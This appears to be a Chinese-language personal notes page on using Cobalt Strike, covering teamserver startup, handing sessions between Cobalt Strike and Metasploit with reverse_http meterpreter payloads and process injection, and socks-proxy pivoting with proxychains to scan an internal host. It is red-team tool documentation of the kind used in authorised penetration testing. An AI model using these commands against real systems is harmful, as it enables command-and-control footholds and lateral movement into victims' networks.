---
title: CS使用
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-24T00:53:50+08:00
categories: 
- 渗透测试
- 工具使用
---

### 简单的启动

创建teamserver 

```
./teamserver 192.168.121.135 uu2fu3o
```

使用windows客户端进行连接

## Cs联动msf

### CS派生到msf

启动msf，启动handler监听

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost xxxxxx   (本机ip)
set lport xxxx
exploit
```

CS新建一个外部监听器

![foregin_http](E:\笔记软件\笔记\渗透测试\工具使用\cs\foregin_http.png)

在控制台执行

```
spawn msf
```

### MSF派生会话到CS

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
设置MSF不启动监听(不然的话msf会提示执行成功，但没有会话建立，同时CS也不会接收到会话)
set disablepayloadhandler true 
set lhost cs-ip
set lport cs-port
set session rhost-session
run
```

这种方法只能向注入32位的payload，如果注入64位payload会导致目标进程崩溃，无法向64位程序中注入32位payload

## CS代理转发

右键会话，启动socks代理

```
socks 8888
socks stop
```

msf中启动

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set srvport 8888
exploit
```

后台即可挂上job,随后编辑proxy文件

```
vim /etc/proxychains.conf
修改代理规则
socks4 转发ip 端口
```

随后使用proxychains.conf+命令的形式使用工具

```
proxychains nmap -Pn -sT -p 3389 192.168.53.138  //例如这里的ip为内网ip，namp扫描需要加-Pn -sT参数，即可成功扫描
```

如果无法使用，或者报错

```
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 error: no valid proxy found in config
```

执行

```
sudo cat /etc/proxychains4.conf > /etc/proxychains.conf
```

再次修改相应的代理即可
